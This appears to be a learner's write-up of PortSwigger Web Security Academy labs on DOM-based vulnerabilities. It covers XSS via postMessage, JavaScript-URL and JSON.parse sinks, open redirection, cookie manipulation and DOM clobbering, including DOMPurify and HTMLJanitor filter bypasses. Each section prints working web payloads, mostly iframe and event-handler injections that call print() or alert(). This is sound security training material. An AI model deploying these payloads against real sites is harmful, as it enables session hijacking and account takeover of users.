# DOM-based vulnerabilities

- https://portswigger.net/web-security/dom-based
- https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-clobbering

## DOM XSS using web messages

No `X-Frame-Options` header that would prevent loading this page in the `iframe` and additionally event listener preset for `message` event without origin verification that passes the input without sanitization to the `innerHtml` function.

Event listener for `message` event is our source, and `innerHtml` function is the sink.

Deliver below payload to the victim to solve the lab. It will load the victim page as an iframe and on load will post a message to all origins, causing vulnerable `message` event listener trigger.

```
<iframe src="https://0aa600ac04c124c89e1a8aa5009800fc.web-security-academy.net/" style="width: 100%; height: 100%;" frameBorder="0" onload='this.contentWindow.postMessage("<img src=X onerror=\"print()\"/>", "*")'></iframe>
```

## DOM XSS using web messages and a JavaScript URL

Same story as before, but this time `message` event listener tries to check whether provided data is the link and update `location.href` by it.

Unfortunately the code shown below does not check whether the provided data starts with `http:` or `https:`, but only if the data contains one of those strings, so it could be bypassed by providing input `javascript:print();//https:`, which when set to `location.href` executes code and calls `print()`

```
window.addEventListener('message', function(e) {
    var url = e.data;
    if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
        location.href = url;
    }
}, false);
```

To solve the lab we can deliver `iframe` containing vulnerable page, which onload posts a message which bypasses the `http` schema check and change `location.href` to `javascript:print()` code which calls the `print()` function.  

```
<iframe src="https://0a7200ce03bc3ad48289581c002500f5.web-security-academy.net/" style="width: 100%; height: 100%;" frameBorder="0" onload='this.contentWindow.postMessage("javascript:print();//https:", "*")'></iframe>
```

## DOM XSS using web messages and JSON.parse

Again no origin check and no `X-Frame-Options` type headers.

This time input is provided via json and `JSON.parse` function is called.
On message receival the page would create an `iframe` and depending on `type` key provided it will take different actions. When `type` is set to `load-channel` it sets `url` json value as iframe `src` without any sanitization.

To prove what can be done with it I have created an `iframe` with target website and executed the below command, which proved that when `iframe.src` is set to `javascript:` schema it will execute code. To make sure the code will not be executed in my website context, but in target website context `alert(document.domain)` is called, which proves we execute code in target page context.

```
document.querySelector("iframe").contentWindow.postMessage('{"type":"load-channel","url":"javascript:alert(document.domain)"}', '*')
```

In order to solve the lab we need to make the victim access below page containing vulnerable website in an `iframe` and making apriopriate `postMessage` call causing js execution.

```
<iframe src="https://0a7700ea031731ad82d2bfc000f8002b.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}", "*")'></iframe>
```

## DOM-based open redirection

`Back to blog` link is generated via `onlick` effect, which takes `url` query param without validation and sanitization and passes it to `location.href`. The query will be passed only if param starts with `http`, so it makes using `javascript:` pseudo protocol for code execution unusable.

```
<a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : "/"'>Back to Blog</a>
```

To solve the lab, we need to access the url with open redirection to exploit server

```
https://0a7f004b034dd93b81637a8000cc00b5.web-security-academy.net/post?postId=7&url=https://exploit-0ad300ad037ad90381cd794e01dc0079.exploit-server.net/
```

## DOM-based cookie manipulation

Product details page contains js code, which sets the cookie value to `windows.location` without any sanitization or validation.

```
<script>
    document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
</script>
```

On the main page, the `lastViewedProduct` cookie is being reflected into the link. Upon changing it to some arbitrary value, like `TEST`, we can observe that the returned page has an `a` tag with `href` value set to `TEST`.

Since the value of the cookie is being reflected on the backend to the link tag, we can try to escape it. By accessing `https://0a5a007d03f480c580c803ff00c6004a.web-security-academy.net/product?productId=1&q='TEST` URL and then navigating to the homepage, we can see, that we break out from the tag with `'` char.

Now, accessing `/product?productId=1&q='autofocus onfocus="print()" x='` and then navigating to the home page, causes `onfocus` `print()` function to be executed immediately, by creating the `a` tag shown below

```
<a href='https://0a5a007d03f480c580c803ff00c6004a.web-security-academy.net/product?productId=1&q='autofocus onfocus="print()" x=''>Last viewed product</a>
```

To solve the lab, deliver to the victim below iframe, which automatically navigates between two sites, causing a `XSS`.

Unfortunately autofocusing `a` tag on `cross-origin` `iframe` was blocked, so to bypass this we can break through not only `a` tag `href` param, but the whole `a` tag itself and, since this is injected server-side, create a new a `script` tag.

```
<iframe src="https://0a5a007d03f480c580c803ff00c6004a.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://0a5a007d03f480c580c803ff00c6004a.web-security-academy.net';window.x=1;">
```

## Exploiting DOM clobbering to enable XSS

Using DOM Invader we can quickly discover `defaultAvatar` variable, which is assigned this way `let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}`. Since `window.defaultAvatar` is not set by default when loading a page, and its content is then passed to `innerHtml` sink without sanitization with this reference `defaultAvatar.avatar`, which makes it a good sink.

Now we can try to clobber this value by creating the comment with proper html. Below try was not successful, because the content was URL encoded, which did not allow breaking out of the string:

```
<a id=defaultAvatar><a id=defaultAvatar name=avatar href='X" onerror=alert(1) x="'>
```

DOMPurify allows you to use the `cid:` protocol, which does not URL-encode double-quotes. This means you can inject an encoded double-quote that will be decoded at runtime. Using this the below payload worked and the next added comment had malicious avatar performing XSS.

```
<a id=defaultAvatar><a id=defaultAvatar name=avatar href='cid:X" onerror=alert(1) x="'>
```

## Clobbering DOM attributes to bypass HTML filters

We can notice the website uses `HTMLJanitor` for cleaning the body of the comments and the autor before passing them to `innerHtml` function. Looking at the Janitor config, we can notice allowed tags and their attributes:

```
input:{name:true,type:true,value:true},form:{id:true},i:{},b:{},p:{}
```

Using `form` and `input` tags we can clobber DOM properties, which will bypass the Janitor check. "Normally, the filter would loop through the `attributes` property of the `form` element and remove any blacklisted attributes. However, because the `attributes` property can be clobbered with the `input` element, the filter will loop through the input element instead. As the input element has an undefined length, the conditions for the for loop of the filter (for example `i<element.attributes.length`) will not be met, and the filter will simply move on to the next element instead. This results in the blacklisted attribute being ignored altogether by the filter"

Testing out theory with the code below proved that we can bypass the Janitor and execute code with onclick event:

```
<form onclick=alert(1)><input id=attributes>Click me
```

In order to auto execute code we can use `tabindex` - which will make the tag focusable - `autofocus` and `onfocus` event attributes. Update the comment to this:

```
<form tabindex=0 autofocus onfocus=print()><input id=attributes>
```

Now since every person accesing this page will trigger XSS, we can simply deliver to the victim link with redirection to this post with malicious comment.

```
<script>
location = "https://0a8000a1042868a2826ee20f00330052.web-security-academy.net/post?postId=5"
</script>
```
